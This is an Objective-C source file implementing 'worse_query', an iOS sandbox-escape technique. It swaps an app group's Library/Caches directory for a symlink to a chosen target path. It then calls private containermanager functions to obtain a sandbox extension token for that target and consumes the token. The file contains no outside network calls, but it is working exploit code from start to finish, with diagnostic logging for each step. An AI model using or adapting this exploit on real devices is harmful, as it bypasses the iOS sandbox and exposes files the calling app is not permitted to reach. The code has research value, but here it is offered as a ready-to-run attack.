//
//  worse_query.m
//  IOSurfaceSafeProbe
//
//  Based on worse_query by Taj C (forcequit) - GPL-3.0
//

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include "worse_query.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

static void clean_symlink(NSString *group) {
    if (group != NULL) {
        NSFileManager *files = [NSFileManager defaultManager];
        NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
        if (groupRoot) {
            NSURL *caches = [groupRoot URLByAppendingPathComponent: @"Library/Caches"];
            [files removeItemAtURL: caches error: nil];
            [files createDirectoryAtURL: caches withIntermediateDirectories: false attributes: nil error: nil];
        }
    }
    return;
}

int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    printf("[WQ] target=%s group=%s alt=%d\n", target.UTF8String, group.UTF8String, alt_flags);
    fflush(stdout);

    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) {
            printf("[WQ] lstat failed errno=%d: %s (ignored)\n", errno, strerror(errno));
            fflush(stdout);
        }
    }

    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
    if (!groupRoot) {
        printf("[WQ] containerURL nil for %s => -1\n", group.UTF8String);
        fflush(stdout);
        return -1;
    }
    printf("[WQ] container=%s\n", groupRoot.path.UTF8String);
    fflush(stdout);
    NSString *caches = [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path];

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        printf("[WQ] dlsym failed => -2\n"); fflush(stdout);
        dlclose(mgr);
        return -2;
    }

    void *query = query_create();
    if (!query) { dlclose(mgr); return -3; }

    xpc_object_t identifier;
    query_set_class(query, 7);
    identifier = xpc_string_create(group.UTF8String);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);
    if (alt_flags) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }

    [files removeItemAtPath: caches error: nil];
    if ([files createSymbolicLinkAtPath: caches withDestinationPath: target error: nil] == false) {
        printf("[WQ] symlink failed => -4\n"); fflush(stdout);
        query_free(query);
        dlclose(mgr);
        clean_symlink(group);
        return -4;
    }
    printf("[WQ] symlink OK\n"); fflush(stdout);

    void *result = query_get_single_result(query);
    if (!result) {
        printf("[WQ] query returned NULL => -5\n"); fflush(stdout);
        query_free(query);
        dlclose(mgr);
        clean_symlink(group);
        return -5;
    }
    printf("[WQ] result=%p\n", result); fflush(stdout);

    char *token = copy_sandbox_token(result);
    if (!token) {
        printf("[WQ] sandbox_token NULL => -6\n"); fflush(stdout);
        query_free(query);
        dlclose(mgr);
        clean_symlink(group);
        return -6;
    }
    printf("[WQ] GOT TOKEN len=%zu\n", strlen(token)); fflush(stdout);

    int64_t handle = consume_extension(token);
    query_free(query);
    free(token);
    dlclose(mgr);
    clean_symlink(group);

    printf("[WQ] handle=%lld\n", (long long)handle); fflush(stdout);
    return handle;
}

void worse_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}
